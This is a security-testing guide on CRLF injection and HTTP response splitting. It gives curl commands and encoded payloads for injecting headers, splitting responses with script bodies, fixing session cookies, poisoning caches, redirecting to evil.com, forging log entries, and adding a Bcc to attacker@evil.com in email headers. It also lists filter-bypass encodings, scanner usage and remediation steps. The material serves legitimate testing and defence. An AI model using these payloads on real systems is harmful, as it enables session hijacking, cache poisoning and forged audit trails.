# CRLF Injection / HTTP Response Splitting Testing

## Overview
CRLF injection exploits insufficient input validation to inject Carriage Return (`\r`, `%0D`) and Line Feed (`\n`, `%0A`) characters into HTTP response headers. This enables HTTP response splitting (injecting entirely new headers or response bodies), log injection/poisoning, session fixation, XSS via injected headers, and cache poisoning. The attack leverages the fact that HTTP headers are delimited by CRLF sequences.

## Classification
- **CWE:** CWE-93 (Improper Neutralization of CRLF Sequences), CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 4.3 - 8.1

## Detection Methodology

### 1. Identify Injection Points
User input that appears in HTTP response headers:
- Redirect parameters (`Location` header)
- Cookie-setting parameters (`Set-Cookie` header)
- Custom header values reflected in response
- URL paths reflected in headers
- Language / locale parameters
- File download names (`Content-Disposition`)
- Any parameter whose value appears in response headers

### 2. Basic CRLF Injection Payloads
```bash
# Standard CRLF injection
curl -s -D- "https://target.com/redirect?url=https://target.com%0d%0aInjected-Header:evil"

# Double CRLF to inject response body (response splitting)
curl -s -D- "https://target.com/redirect?url=https://target.com%0d%0a%0d%0a<html>Injected</html>"

# Check if injected header appears in response
# Expected vulnerable response:
# HTTP/1.1 302 Found
# Location: https://target.com
# Injected-Header: evil
```

### 3. Encoding Variations
```bash
# URL encoded
%0d%0a                    # \r\n
%0D%0A                    # \r\n (uppercase)

# Double URL encoded
%250d%250a

# Unicode variants
%E5%98%8A%E5%98%8D        # Unicode CRLF equivalent

# Mixed encoding
%0d%0A
%0D%0a

# Null byte + CRLF
%00%0d%0a

# Tab + CRLF
%09%0d%0a

# CR only / LF only (some servers accept partial)
%0d                       # CR only
%0a                       # LF only

# UTF-8 encoding
\u000d\u000a

# HTML entity (in HTML context)
&#13;&#10;
```

### 4. HTTP Response Splitting
Inject a complete second HTTP response:
```bash
# Inject second response (classic response splitting)
curl -s -D- "https://target.com/redirect?url=legit%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>"
```

### 5. Header Injection Attacks

**XSS via injected header:**
```bash
# Inject Content-Type to enable XSS
/redirect?url=x%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

**Session fixation via Set-Cookie:**
```bash
# Inject Set-Cookie header
/redirect?url=x%0d%0aSet-Cookie:%20session=attacker_controlled_value
```

**Cache poisoning via CRLF:**
```bash
# Inject caching headers
/page?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aCache-Control:%20public%0d%0a%0d%0a<script>alert(1)</script>
```

**Redirect to attacker site:**
```bash
# Overwrite Location header
/redirect?url=%0d%0aLocation:%20https://evil.com%0d%0a%0d%0a
```

### 6. Log Injection / Log Poisoning
```bash
# Inject fake log entries via CRLF in User-Agent or other logged fields
curl -s -H "User-Agent: normal%0d%0a[2026-03-19] Admin logged in from 10.0.0.1" \
  https://target.com/

# Inject into application log parameters
/search?q=test%0d%0a[INFO]%20User%20admin%20logged%20in%20successfully

# Impact: confuse log analysis, hide attacks, forge audit trails
```

### 7. Email Header Injection (Related)
```bash
# If user input goes into email headers
POST /contact
name=test%0d%0aBcc:attacker@evil.com&message=hello

# Or in the subject
subject=Hello%0d%0aBcc:%20attacker@evil.com&body=test
```

### 8. Context-Specific Testing

**In URL path:**
```bash
curl -s -D- "https://target.com/path%0d%0aInjected:%20header/page"
```

**In cookie values:**
```bash
curl -s -D- -b "lang=en%0d%0aInjected:%20header" https://target.com/
```

**In POST body reflected in headers:**
```bash
curl -s -D- -X POST https://target.com/set-preference \
  -d "theme=dark%0d%0aInjected:%20header"
```

## Tool Usage
```bash
# CRLFuzz - automated CRLF injection scanner
crlfuzz -u "https://target.com/redirect?url=FUZZ" -s

# Nuclei CRLF templates
nuclei -u https://target.com -t http/cves/ -tags crlf -batch
nuclei -l urls.txt -t http/vulnerabilities/crlf/ -batch

# Manual bulk testing
while read url; do
  resp=$(curl -s -D- -o /dev/null "$url%0d%0aInjected:CRLFTest" 2>&1)
  if echo "$resp" | grep -qi "Injected:CRLFTest"; then
    echo "[VULNERABLE] $url"
  fi
done < redirect_urls.txt

# Burp Suite
# 1. Identify parameters reflected in response headers
# 2. Inject %0d%0a sequences in Repeater
# 3. Use Intruder with CRLF payload list for bulk testing

# HTTPie for quick testing
http --print=hH GET "https://target.com/redirect?url=test%0d%0aEvil:Header"
```

## Remediation
1. **Strip CRLF characters** -- remove or encode `\r` and `\n` from all user input before using in headers
2. **Use framework header APIs** -- use built-in response header methods that auto-encode (e.g., `response.setHeader()`)
3. **Input validation** -- reject input containing `%0d`, `%0a`, `\r`, `\n` for header-bound values
4. **URL encoding** -- properly encode redirect URLs before placing in `Location` header
5. **Output encoding** -- encode special characters in log output
6. **Update server software** -- modern web servers reject CRLF in many contexts by default
7. **WAF rules** -- detect and block CRLF patterns in request parameters
8. **Content-Security-Policy** -- mitigate impact of injected scripts

## Evidence Collection
- Injection point (parameter, header, path)
- Payload used (exact encoding)
- HTTP response showing injected header(s) or response body
- Impact demonstration (XSS, session fixation, cache poisoning)
- Server and framework version (some are immune by default)
- Filter bypass technique used (if applicable)
- Log injection evidence (if applicable)
